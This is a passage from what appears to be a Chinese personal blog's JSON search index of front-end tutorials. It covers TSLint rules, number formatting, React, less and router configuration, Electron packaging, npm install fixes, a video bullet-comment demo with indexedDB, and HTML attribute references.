&quot;jsx-double&quot;, &quot;avoid-template&quot;, &quot;avoid-escape&quot; ], // 行尾必须有分号 &quot;semicolon&quot;: [ true, &quot;always&quot;, &quot;ignore-interfaces&quot; ], // 函数名前必须有空格 &quot;space-before-function-paren&quot;: [ true, &quot;asyncArrow&quot; ], // 括号内首尾禁止有空格 &quot;space-within-parens&quot;: [ true, 0 ], // 禁止 finally 内出现 return, continue, break, throw 等 // finally 会比 catch 先执行 &quot;no-unsafe-finally&quot;: true&#125;","tags":[{"name":"typescript","slug":"typescript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/typescript/"},{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"}]},{"title":"一些惊艳的字符串处理方法","date":"2020-09-24T07:49:01.000Z","path":"2020/09/24/number-format-methods/","text":"数字格式化 描述：将一串123483245678 处理成为 123,483,245,678 eg1:自己写的一个比较麻烦的方法 123456789101112131415161718 // 只实现了整数，其他同理，最好在获取到参数之后进行验证，是否符合自己的需求 function formatNumber(value) &#123; console.log(value) let arrStr = [] const arr = (value + &#x27;&#x27;).split(&#x27;,&#x27;) for(let i = 0; i &lt; arr.length; i++) &#123; let index = 0 for(let j = arr[i].length - 1; j &gt;= 0;j--) &#123; if(index !== 0 &amp;&amp; index % 3 === 0) &#123; arrStr= [&#x27;,&#x27;,...arrStr] &#125; arrStr= [arr[i][j],...arrStr] index++ &#125; &#125; return arrStr.join(&#x27;&#x27;)&#125;formatNumber(1234567890) eg2:toLocaleString 1(123456789).toLocaleString(&#x27;en-US&#x27;) eg3:正则表达式 12345function formatNumber(str) &#123; return str.replace(/\\B(?=(\\d&#123;3&#125;)+(?!\\d))/g, &#x27;,&#x27;)&#125;console.log(formatNumber(&quot;123456789&quot;)) eg4: 12345678910111213141516function formatNumber(str) &#123; let arr = [], count = str.length while (count &gt;= 3) &#123; arr.unshift(str.slice(count - 3, count)) count -= 3 &#125; // 如果是不是3的倍数就另外追加到上去 str.length % 3 &amp;&amp; arr.unshift(str.slice(0, str.length % 3)) return arr.toString()&#125;console.log(formatNumber(&quot;1234567890&quot;)) eg5: 123456789function formatNumber(str) &#123; // [&quot;0&quot;, &quot;9&quot;, &quot;8&quot;, &quot;7&quot;, &quot;6&quot;, &quot;5&quot;, &quot;4&quot;, &quot;3&quot;, &quot;2&quot;, &quot;1&quot;] return str.split(&quot;&quot;).reverse().reduce((prev, next, index) =&gt; &#123; return ((index % 3) ? next : (next + &#x27;,&#x27;)) + prev &#125;)&#125;console.log(formatNumber(&quot;1234567890&quot;))","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"method","slug":"method","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/method/"}]},{"title":"react-学习之路-配置","date":"2020-09-18T01:53:38.000Z","path":"2020/09/18/react-study-config/","text":"Q: 如何配置路径别名 A: 前置条件 安装 npm react-app-rewired --save-dev 根目录（即src所在目录）创建config-overrides.js, 添加如下内容 12345678910const &#123; override, fixBabelImports, addWebpackAlias &#125; = require(&#x27;customize-cra&#x27;)const path = require(&#x27;path&#x27;)function resolve(dir) &#123; return path.join(__dirname, &#x27;.&#x27;, dir)&#125;module.exports = override( addWebpackAlias(&#123; [&quot;@&quot;]: path.resolve(__dirname, &quot;src&quot;) &#125;)) 修改 package.json 中的启动命令 123&quot;script&quot;: &#123; &quot;dev&quot;: &quot;react-app-rewired start&quot;&#125; 修改完成之后重新启动","tags":[{"name":"react","slug":"react","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/react/"}]},{"title":"react - 学习之路 - 问题解决集锦","date":"2020-09-18T01:49:13.000Z","path":"2020/09/18/react-study-error/","text":"Q: 如何将带有html标签的字符串以html的形式在div等元素中显示出来 A: 使用元素的 dangerouslySetInnerHTML 可以将带有html标签的字符串转化为html 1dangerouslySetInnerHTML=&#123;&#123; __html:item.content&#125;&#125;（vue中直接使用v-html就可以成功转化）","tags":[{"name":"react","slug":"react","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/react/"}]},{"title":"react 项目中使用less","date":"2020-09-03T07:30:35.000Z","path":"2020/09/03/react-less-loader/","text":"插件安装 1npm install react-app-rewired customize-cra babel-plugin-import -D 在项目根目录创建文件 config-overrides.js 1234const &#123;...&#125; = require(&#x27;customize-cra&#x27;);module.exports = override( ...); react 按需加载配置 12345678const &#123; override, fixBabelImports &#125; = require(&quot;customize-cra&quot;);module.exports = override( fixBabelImports(&#x27;import&#x27;, &#123; libraryName: &#x27;antd&#x27;, libraryDirectory: &#x27;es&#x27;, style: true,//或者css, true代表运用less &#125;),); 修改package.json 123456&quot;scripts&quot;: &#123; &quot;start&quot;: &quot;react-app-rewired start&quot;, &quot;build&quot;: &quot;react-app-rewired build&quot;, &quot;test&quot;: &quot;react-app-rewired test&quot;, &quot;eject&quot;: &quot;react-app-rewired eject&quot;&#125;, 编译less文件 1234567yarn add --dev less less-loader //less-loader用5.0版本，高版本停用了一些配属性//config-overrides.js内容const &#123; override,addLessLoader&#125; = require(&quot;customize-cra&quot;);module.exports = override( addLessLoader(&#123; javascriptEnabled: true, modifyVars: &#123;&#125; &#125;),); 装饰器 123456npm install -D @babel/plugin-proposal-decorators//config-overrides.jsconst &#123; override, addDecoratorsLegacy&#125; = require(&#x27;customize-cra&#x27;);module.exports = override( addDecoratorsLegacy()); 问题解决 出现如下报错 ValidationError: Invalid options object. Less Loader has been initialized using an options object that does not match the API schema.options has an unknown property ‘modifyVars’. These properties are valid:object { lessOptions?, prependData?, appendData?, sourceMap?, implementation? }。 解决方案将 1234addLessLoader(&#123; javascriptEnabled: true, modifyVars: &#123;&#125;&#125;), 修改为 123456addLessLoader(&#123; lessOptions: &#123; javascriptEnabled: true, modifyVars: &#123;&#125; &#125;&#125;),","tags":[{"name":"react","slug":"react","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/react/"},{"name":"less","slug":"less","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/less/"},{"name":"webpack","slug":"webpack","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/webpack/"},{"name":"react-app-rewired","slug":"react-app-rewired","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/react-app-rewired/"},{"name":"customize-cra","slug":"customize-cra","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/customize-cra/"}]},{"title":"重拾 react","date":"2020-08-28T07:11:36.000Z","path":"2020/08/28/react-study/","text":"由于最近一段时间一直在使用vue做项目，最近打算重拾react，在此记录react的点滴学习，实时更新 生命周期 routerWillLeave 路由跳转前确认 return false 取消本次跳转 return 返回提示信息，在离开Route前提示用户进行确认 12345678910import &#123; Lifecycle &#125; from &#x27;react-router&#x27;const Home = React.createClass(&#123; // 假设 Home 是一个 route 组件，它可能会使用 // Lifecycle mixin 去获得一个 routerWillLeave 方法。 mixins: [ Lifecycle ], routerWillLeave(nextLocation) &#123; if (!this.state.isSaved) return &#x27;Your work is not saved! Are you sure you want to leave&#x27; &#125;,&#125;)","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"react","slug":"react","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/react/"}]},{"title":"重拾 react - React模板 antd","date":"2020-08-28T04:05:15.000Z","path":"2020/08/28/react-study-antd/","text":"由于最近一段时间一直在使用vue做项目，最近打算重拾react，在此记录react的点滴学习，实时更新 antd 是一款优秀的react 前端页面框架 插件使用 插件： antd 安装： npm install -S antd 使用： import &#123;Layout, Button&#125; from &#39;antd&#39; 组件 布局 Layout 12import &#123;Layout&#125; from &#x27;antd&#x27;const &#123;Header,Side,Content,Footer&#125; = Layout","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"react","slug":"react","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/react/"},{"name":"antd","slug":"antd","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/antd/"}]},{"title":"重拾 react - React-Router","date":"2020-08-28T03:52:22.000Z","path":"2020/08/28/react-study-router/","text":"由于最近一段时间一直在使用vue做项目，最近打算重拾react，在此记录react的点滴学习，实时更新 插件使用 插件： react-router-dom 安装： npm install -S react-router-dom 使用： import &#123;Router&#125; from &#39;react-router-dom&#39; Router 配置的方法 第一种 123456789101112131415import &#123; Redirect &#125; from &#x27;react-router&#x27;React.render(( &lt;Router&gt; &lt;Route path=&quot;/&quot; component=&#123;App&#125;&gt; &lt;IndexRoute component=&#123;Dashboard&#125; /&gt; &lt;Route path=&quot;about&quot; component=&#123;About&#125; /&gt; &lt;Route path=&quot;inbox&quot; component=&#123;Inbox&#125;&gt; &lt;Route path=&quot;/messages/:id&quot; component=&#123;Message&#125; /&gt; &#123;/* 跳转 /inbox/messages/:id 到 /messages/:id */&#125; &lt;Redirect from=&quot;messages/:id&quot; to=&quot;/messages/:id&quot; /&gt; &lt;/Route&gt; &lt;/Route&gt; &lt;/Router&gt;), document.body) 第二种 12345678910111213141516171819202122const routeConfig = [ &#123; path: &#x27;/&#x27;, component: App, indexRoute: &#123; component: Dashboard &#125;, childRoutes: [ &#123; path: &#x27;about&#x27;, component: About &#125;, &#123; path: &#x27;inbox&#x27;, component: Inbox, childRoutes: [ &#123; path: &#x27;/messages/:id&#x27;, component: Message &#125;, &#123; path: &#x27;messages/:id&#x27;, onEnter: function (nextState, replaceState) &#123; replaceState(null, &#x27;/messages/&#x27; + nextState.params.id) &#125; &#125; ] &#125; ] &#125;]React.render(&lt;Router routes=&#123;routeConfig&#125; /&gt;, document.body) 组件类型 Router 最外层路由，包裹所有的路由 HashRouter 哈希路由 BrowserRouter 历史路由 Route 路由页面地址 Link 路由跳转 IndexRoute 用来设置一个默认路由 Redirect 路由重定向 Switch 有Switch标签，则其中的Route在路径相同的情况下，只匹配第一个，这个可以避免重复匹配 IndexLink 只有定义的路由被渲染后才激活 导航路由 历史路由模式 123// somewhere like a redux/flux action file:import &#123; browserHistory &#125; from &#x27;react-router&#x27;browserHistory.push(&#x27;/some/path&#x27;) 哈希路由模式 123// somewhere like a redux/flux action file:import &#123; HashHistory &#125; from &#x27;react-router&#x27;HashHistory.push(&#x27;/some/path&#x27;)","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"react","slug":"react","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/react/"},{"name":"router","slug":"router","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/router/"}]},{"title":"electron - 使用javascript编写pc应用 - 01","date":"2020-08-20T01:30:05.000Z","path":"2020/08/20/electron-study-01/","text":"在electron官网根据文档指示，下载了一个electron模板并安装依赖成功运行 练习项目git地址 版本发布 插件： electron-packager 安装： npm install -g electron-packager 打包： package&quot;: &quot;electron-packager ./ demo_app --platform=win32 --out ../demo_app_release --version 1.4.13 --overwrite --icon=./images/app.ico 模块 electron 提供了许多api来方便我们调用 Dialog模块 showOpenDialog(browserWindow, options, callback) _browserWindow_ BrowserWindow (可选) 打包 Q: react 文件打包之后，访问index.html,文件报错找不到js和css文件 A: react 路由模式由 history模式修改为 hash模式, package.json 里面添加配置 homePage: &#39;.&#39; Q: 使用electron打包，窗口白屏，无法加载文件 A: 将package.json, electron的入口文件，（以及预加载文件preload.js）复制到react打包后的项目 build文件夹中， 然后修改electron的入口文件 electron.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748const &#123;app, BrowserWindow&#125; = require(&#x27;electron&#x27;)const path = require(&#x27;path&#x27;)const url = require(&#x27;url&#x27;)// const &#123; url &#125; = require(&#x27;inspector&#x27;)function createWindow () &#123; // 隐藏菜单栏 // Menu.setApplicationMenu(null) const mainWindow = new BrowserWindow(&#123; width: 800, height: 600, // icon: path.join(__dirname, &#x27;/assets/img/2.jpg&#x27;), // title: &#x27;this is a electron&#x27; webPreferences: &#123; javascript: true, plugins: true, nodeIntegration: true, // 是否集成 Nodejs webSecurity: false, preload: path.join(__dirname, &#x27;preload.js&#x27;) &#125; &#125;) // and load the index.html of the app. // mainWindow.loadFile(path.join(__dirname, &#x27;index.html&#x27;)) // Open the DevTools. // mainWindow.webContents.openDevTools() // mainWindow.loadURL(&#x27;http://localhost:3000/&#x27;) // 加载应用----react 打包 mainWindow.loadURL(url.format(&#123; pathname: path.join(__dirname, &#x27;./index.html&#x27;), protocol: &#x27;file:&#x27;, slashes: true &#125;))&#125;app.whenReady().then(() =&gt; &#123; createWindow() console.log(&#x27;ready&#x27;) app.on(&#x27;activate&#x27;, function () &#123; if (BrowserWindow.getAllWindows().length === 0) createWindow() &#125;)&#125;)app.on(&#x27;window-all-closed&#x27;, function () &#123; if (process.platform !== &#x27;darwin&#x27;) app.quit()&#125;)","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"html","slug":"html","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/html/"},{"name":"css","slug":"css","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/css/"},{"name":"electron","slug":"electron","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/electron/"}]},{"title":"第三方插件安装采坑  -  01","date":"2020-08-19T09:16:20.000Z","path":"2020/08/19/npm-third-party-plugin-in/","text":"此博客用来记录使用第三方插件安装及使用的时候采坑记录 electron 安装 npm install 报错 123Error: read ECONNRESET# 或者Error: Electron failed to install correctly ... 解决方式 1234// 设置镜像set &quot;ELECTRON_MIRROR=http://npm.taobao.org/mirrors/electron&quot;// 安装npm install","tags":[{"name":"npm","slug":"npm","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/npm/"}]},{"title":"HOW TO 制作一个简易的弹幕demo","date":"2020-08-13T07:21:48.000Z","path":"2020/08/13/html-video-chat-bullet/","text":"闲来无事，对于bili上面的弹幕感兴趣，于是自己打算尝试制作一个简单的弹幕系统 页面布局 首先先创建一个容器用来存放video播放器和弹幕发射器,注意要有一个遮罩层设置透明度为0,用来显示我们输入的弹幕,位于视频的上方,为了使视频的显示不那么突兀,我们可以把存放视频的容器的背景颜色设置成深色或者黑色 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .chat-bullet-container &#123; width: 400px; height: 300px; position: absolute; top: 40px; left: 50%; transform: translateX(-50%); &#125; .chat-bullet-video-container &#123; width: 400px; height: 250px; background-color: rgb(0, 0, 0); &#125; .chat-bullet-video-container video &#123; max-width: 100%; max-height: 100%; position: absolute; top: 50%; left: 50%; transform: translateX(-50%) translateY(-62%); &#125; .chat-bullet-video-container #chat-bullet-video-text &#123; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0); &#125; .chat-text &#123; position: absolute; top: 70px; left: 70px; color: #000000; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;chat-bullet-container&quot;&gt; &lt;!-- 播放 --&gt; &lt;div id=&quot;chat-bullet-video-container&quot; class=&quot;chat-bullet-video-container&quot;&gt; &lt;video id=&quot;video&quot; src=&quot;./demo.mp4&quot; controls=&quot;true&quot;&gt;&lt;/video&gt; &lt;div id=&quot;chat-bullet-video-text&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;chat-bullet-video-method&quot;&gt; &lt;!-- &lt;input id=&quot;color&quot; type=&quot;color&quot;&gt; --&gt; &lt;input id=&quot;chat-input&quot; type=&quot;text&quot;&gt; &lt;button type=&quot;text&quot; onclick=&quot;handleSend()&quot;&gt;发送&lt;/button&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 功能实现 接下来给弹幕发射器添加点击事件，点击的时候让我们发送的文字显示在视频上面 获取遮罩层元素及其宽高,作为弹幕显示和滚动的限制条件 123const chatContainer = document.getElementById(&#x27;chat-bullet-video-text&#x27;)const height = chatContainer.offsetHeightconst width = chatContainer.offsetWidth 为发送弹幕按钮添加点击事件,生成随机颜色和位置的弹幕，然后通过appendChild方法将生成的弹幕放到 123456789101112function handleSend() &#123; const input = document.getElementById(&#x27;chat-input&#x27;) const msg = input.value const text = document.createElement(&#x27;span&#x27;) text.innerHTML = msg let style = `position: absolute; top: $&#123;Math.random() * height&#125;px; right: 30px; color: rgb($&#123;Math.random() * 255&#125;,$&#123;Math.random() * 255&#125;,$&#123;Math.random() * 255&#125;);` this.element.setAttribute(&#x27;style&#x27;, style) this.chatContainer.appendChild(this.element)&#125; 这个时候当我们在输入框中输入内容的时候，点击发送的时候就会发现我们写的内容随机显示在视频上面 接下来做的就是让弹幕能够动起来，本次实现的是从右向左移动 但是弹幕不可能只发送一个，弹幕通常来说是很多个的，这个时候如何用上述的方法来添加弹幕和控制弹幕的话显然是不合理。 这个时候我们应该做的是让每个添加的弹幕之间是独立的，互不影响的，能够独立运行，这时候我借鉴了之前学习canvas时使用的方法：创建一个class类，在这个类中实现弹幕的属性初始化，渲染，运行及删除事件 12345678910111213141516171819202122232425262728293031323334353637// 弹幕渲染及移动类class Chat &#123; constructor(element, chatContainer, data) &#123; this.element = element this.chatContainer = chatContainer this.init() &#125; init() &#123; this.ccx = this.chatContainer.offsetWidth this.ccy = this.chatContainer.offsetHeight // 弹幕速度 this.s = Math.random() + 4 &#125; // 渲染带有样式的弹幕 paint() &#123; let style = `position: absolute; top: $&#123;Math.random() * this.ccy&#125;px; right: $&#123;this.mx&#125;; color: rgb($&#123;Math.random() * 255&#125;,$&#123;Math.random() * 255&#125;,$&#123;Math.random() * 255&#125;);` this.element.setAttribute(&#x27;style&#x27;, style) this.chatContainer.appendChild(this.element) this.mx = -this.element.offsetWidth this.element.style.right = this.mx + &#x27;px&#x27; this.element.style.display = &#x27;none&#x27; &#125; // 移动弹幕，使弹幕从右向左移动 move() &#123; this.mx = this.mx + this.s this.element.style.display = &#x27;inline-block&#x27; this.element.style.right = this.mx + &#x27;px&#x27; &#125; delete(index) &#123; if(this.mx &gt;= this.ccx) &#123; this.element.style.display = &#x27;none&#x27; &#125; &#125;&#125; 点击事件也应该根据实际情况进行修改，同时定义一个数组用来存放我们添加的弹幕的类 12345678910const chartList = []function handleSend() &#123; const input = document.getElementById(&#x27;chat-input&#x27;) const msg = input.value const text = document.createElement(&#x27;span&#x27;) text.innerHTML = msg const chat = new Chat(text, chatContainer, &#123;color: &#x27;red&#x27;&#125;) chat.paint() chartList.push(chat)&#125; 但是想要让弹幕动起来可不是那么简单的事情，因为我们上述操作只是使弹幕渲染到了视频上面，并没有使弹幕动起来，这时我们可以定义一个定时器，时间间隔要短，在定时器中我们循环存放弹幕的数组，调用弹幕自身的移动事件及删除事件 123456setInterval(() =&gt; &#123; for(var i = 0; i &lt; chartList.length; i++) &#123; chartList[i].move() chartList[i].delete(i) &#125;&#125;, 100) 将弹幕与视频关联起来 想要做成根据视频播放来显示历史弹幕就要将弹幕和视频当前播放时间进行关联 12345678910111213// 给视频添加监听事件，监听视频运行// video ended functionvideo.addEventListener(&#x27;ended&#x27;, function() &#123; console.log(video_Status)&#125;)// 监听视频播放，获取当前播放时间video.addEventListener(&#x27;canplay&#x27;, function() &#123; console.log(this.duration)&#125;)// 监听视频播放，获取当前播放时间video.addEventListener(&#x27;timeupdate&#x27;, function() &#123; currentTime = this.currentTime&#125;) 获取到视频播放时间之后，接下来就是将时间和弹幕关联起来存储，如果没有后台的支持的话可以使用localStorage和indexedDB来存储数据，这里我推介使用indexedDB，因为可以练习一下indexedDB的知识，同时indexedDB的存储空间也比localStorage的存储空间要大很多 首先检测indexedDB是否启用，同时创建所需要使用的数据库和表，设置主键 1234567891011121314function checkIndexedDB(database, table) &#123; const request = window.indexedDB.open(database, 3) request.onupgradeneeded = function(e) &#123; const db = e.target.result if(!db.objectStoreNames.contains(table)) &#123; const tables = db.createObjectStore(table, &#123; keyPath: &#x27;id&#x27;, // 使用当前时间戳可以避免id重复 autoIncreament: true &#125;) &#125; console.log(123123) db.close() &#125;&#125; 然后连接数据库，向表中插入数据 123456789function linkIndexedDB(database, table) &#123; const request = window.indexedDB.open(database) return new Promise((resolve, reject) =&gt; &#123; request.onsuccess = function(e) &#123; const db = e.target.result resolve(db) &#125; &#125;)&#125; 同时将弹幕的print()进行修改，每创建一条弹幕就存储一次 12345678910111213141516171819202122// 渲染带有样式的弹幕 paint() &#123; console.log(currentTime, &#x27;chat&#x27;) let style = `position: absolute; top: $&#123;Math.random() * this.ccy&#125;px; right: $&#123;this.mx&#125;; color: rgb($&#123;Math.random() * 255&#125;,$&#123;Math.random() * 255&#125;,$&#123;Math.random() * 255&#125;);` this.element.setAttribute(&#x27;style&#x27;, style) this.chatContainer.appendChild(this.element) this.mx = -this.element.offsetWidth this.element.style.right = this.mx + &#x27;px&#x27; this.element.style.display = &#x27;none&#x27; linkIndexedDB(&#x27;test&#x27;, &#x27;chat&#x27;).then(db =&gt; &#123; console.log(db) const request = db.transaction([&#x27;chat&#x27;], &#x27;readwrite&#x27;).objectStore(&#x27;chat&#x27;) .add(&#123;id: Date.now(), element: this.element.innerHTML, style: style, currentTime: currentTime, createUser: &#x27;lxx&#x27;, speed: this.s&#125;) request.onsuccess = function(e) &#123; console.log(&#x27;添加成功&#x27;) db.close() &#125; &#125;) &#125; 未完待续。。。。。","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"HTML","slug":"HTML","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/HTML/"}]},{"title":"HTML 标签及函数","date":"2020-08-11T02:09:34.000Z","path":"2020/08/11/html-label-function/","text":"HTML全局属性 accesskey 规定激活元素的快捷键，使元素获得焦点（Opera浏览器不支持此选项） 以下元素支持accesskey a, area, button, input, label, legend 以及 textarea contenteditable 规定元素内容是否可编辑，如果元素未设置contenteditable 属性，那么元素将会从其父元素继承该属性 contenteditable = true | false contextmenu 规定 div 元素的上下文菜单。上下文菜单会在用户右键点击元素时出现，contextmenu 属性的值是要打开的 menu 元素的 id，目前只有fireFox支持 123456&lt;div contextmenu=&quot;mymenu&quot;&gt; &lt;menu type=&quot;context&quot; id=&quot;mymenu&quot;&gt; &lt;menuitem label=&quot;Refresh&quot;&gt;&lt;/menuitem&gt; &lt;menuitem label=&quot;Twitter&quot;&gt;&lt;/menuitem&gt; &lt;/menu&gt;&lt;/div&gt; data-* 用来嵌入自定义数据，赋予我们在所有 HTML 元素上嵌入自定义 data 属性的能力，属性名不应该包含任何大写字母，并且在前缀 “data-“ 之后必须有至少一个字符 dir 属性规定元素内容的文本方向 ltr: 从左到右 rtl: 从右到左 dir属性在以下标签中无效base, br, frame, frameset, hr, iframe, param 以及 script draggable 规定元素是否可拖拽 true|false|auto 在使用时要和函数连用ondragstart,ondragover,ondrop 123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; html,body&#123; width: 100%; height: 100%; &#125; #div&#123; position: absolute; top: 200px; border: 1px solid rebeccapurple; height: 20px; width: 100px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body &gt; &lt;div id=&quot;div&quot; ondrop=&quot;drop(event)&quot; ondragover=&quot;allowDrop(event)&quot;&gt;&lt;/div&gt; &lt;p id=&quot;drag&quot; draggable=&quot;true&quot; dropzone=&quot;link&quot; ondragstart=&quot;drag(event)&quot;&gt;3242342342&lt;/p&gt; &lt;script&gt; function drag(e) &#123; console.log(e) e.dataTransfer.setData(&#x27;Text&#x27;, e.target.id) &#125; function drop(e) &#123; var data = e.dataTransfer.getData(&quot;Text&quot;); e.target.appendChild(document.getElementById(data)); e.preventDefault(); &#125; function allowDrop(e) &#123; e.preventDefault(); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 在与contenteditable连用时不起作用 dropzone 拖动数据会产生被拖动数据的副本 copy 拖动数据会产生被拖动数据的副本。 move 拖动数据会导致被拖动数据被移动到新位置。 link 拖动数据会产生指向原始数据的链接。 暂无浏览器支持 hidden 规定元素是否显示 是布尔属性 hidden属性可以用于防止用户查看元素，知道匹配某些条件 在 XHTML 中，属性简写是禁止的，hidden 属性必须定义为 &lt;element hidden=&quot;hidden&quot;&gt; lang 规定了元素内容的语言 zh,en lang 属性在以下标签中无效：&lt;base&gt;, &lt;br&gt;, &lt;frame&gt;, &lt;frameset&gt;, &lt;hr&gt;, &lt;iframe&gt;, &lt;param&gt; 以及 &lt;script&gt;。 spellcheck 规定是否对元素进行拼写和语法检查 input 元素中的文本值（非密码） &lt;textarea&gt; 元素中的文本 可编辑元素中的文本 tabindex 规定元素的 tab 键控制次序（当 tab 键用于导航时） 以下元素支持 tabindex 属性：&lt;a&gt;, &lt;area&gt;, &lt;button&gt;, &lt;input&gt;, &lt;object&gt;, &lt;select&gt; 以及 &lt;textarea&gt;,几乎所有浏览器均 tabindex 属性，除了 Safari translate 规定不应翻译某些元素 所有主流浏览器都无法正确地支持 translate 属性,请使用 class=”notranslate” 替代 HTML事件属性 Window 事件属性 针对 window 对象触发的事件（应用到 标签） onload 页面结束加载之后触发 onresize 浏览器窗口被调整大小时触发 onunload 一旦页面已下载时触发（或者浏览器窗口已被关闭） Form 事件 由 HTML 表单内的动作触发的事件（应用到几乎所有 HTML 元素，但最常用在 form 元素中） onblur 元素失去焦点时运行的脚本 onchange 元素值被改变时运行的脚本 onfocus 当元素获得焦点时运行的脚本 onselect 在元素中文本被选中后触发 onsubmit 在提交表单时触发 keyboard 事件 onkeyup 用户释放按键时触发 onkeydown 用户按下按键时触发 onkeypress 用户敲击按钮时触发 mouse 事件 onclick 元素发生鼠标点击时触发 ondbclick 元素发生鼠标双击时触发 ondrag, ondragend, ondragstart ondrop, ondragenter, ondragerleave, ondragover 元素拖拽时触发 onmousedown 按下鼠标按钮时触发 onmouseup 释放鼠标按钮时触发 onmousemove 鼠标指针移动到元素上触发 onmouseover 鼠标指针移出到元素上触发 onmousewheel 鼠标滚轮正在滚动时运行的脚本 onscroll 当元素滚动条被滚动时运行的脚本 Media 事件 onabort 在退出时运行的脚本 oncanplay 当文件就绪可以开始播放时运行的脚本(缓冲已足够开始时) onwaiting 当媒介已停止播放单打算继续播放时 标签 base 标签 &lt;base href=&quot;http://www.baidu.com/static/&quot;&gt; &lt;base&gt; 标签为页面上所有链接规定默认地址和默认目标，在通常情况下浏览器会从单签文档的url中提取响应的元素来填写URL中的空白，但是&lt;base&gt;标签可以改变着一点，浏览器随后将不再使用当前文档的url，而是使用指定的基本url，包括&lt;a&gt;,&lt;img&gt;,&lt;link&gt;,&lt;form&gt;标签中的URL &lt;base&gt;标签必须位于head元素内部 basefont 标签 &lt;basefont color=&quot;red&quot; size=&quot;5&quot;&gt; 规定页面上默认字体颜色和字号, 主流浏览器暂不支持此标签 blockquote 标签 &lt;blockquote&gt; 标签定义块引用， 标签中的所有文本都会从常规文本中分离出去，经常左右两边有间距，而且有时会使用斜体，也就是说块引用拥有自己的空间 把页面作为 strict XHTML 进行验证，那么 &lt;blockquote&gt; 元素必须包含块级元素 datalist 标签 datalist 描述了input 标签的可能值 123456&lt;input id=&quot;myCar&quot; list=&quot;cars&quot;&gt;&lt;datalist id=cars&gt; &lt;option value=&quot;BMW&quot;&gt; &lt;option value=&quot;FORD&quot;&gt; &lt;option value=&quot;VOLVO&quot;&gt;&lt;/datalist&gt; datalist 标签标签定义选项列表，与input元素配合使用，定义input可能的值，datalist及其元素不会被显示出来，仅仅是合法输入值列表， 用input的list属性来绑定datalist del 删除线 details 标签 用于描述文档或者文档某个部分的细节 1234&lt;details&gt; &lt;summary&gt;Copyright 2011.&lt;/summary&gt; &lt;p&gt;All pages and graphics on this web site are the property of W3School.&lt;/p&gt;&lt;/details&gt; 目前只有 Chrome 支持 &lt;details&gt; 标签。 dialog 标签 dialog 标签定义对话框或窗口是HTML5的新标签 embed 标签 &lt;embed&gt; 标签定义嵌入的内容，比如插件。 1&lt;embed src=&quot;helloworld.swf&quot; type=&quot;MIME_type&quot; /&gt; fieldset 标签 1234567&lt;form&gt; &lt;fieldset&gt; &lt;legend&gt;health information&lt;/legend&gt; height: &lt;input type=&quot;text&quot; /&gt; weight: &lt;input type=&quot;text&quot; /&gt; &lt;/fieldset&gt;&lt;/form&gt; &lt;fieldset&gt; 元素可将表单内的相关元素分组，将表单内容的一部分打包，生成一组相关表单的字段 &lt;legend&gt; 标签为&lt;fieldset&gt; 元素定义标题。 figcaption 标签 用作文档中插图的图像，带有一个标题 1234&lt;figure&gt; &lt;figcaption&gt;黄浦江上的的卢浦大桥&lt;/figcaption&gt; &lt;img src=&quot;shanghai_lupu_bridge.jpg&quot; width=&quot;350&quot; height=&quot;234&quot; /&gt;&lt;/figure&gt; &lt;figcaption&gt; 标签定义 figure 元素的标题,应该被置于 “figure” 元素的第一个或最后一个子元素的位置 frame 标签 12345&lt;frameset cols=&quot;25%,50%,25%&quot;&gt; &lt;frame src=&quot;frame_a.htm&quot; /&gt; &lt;frame 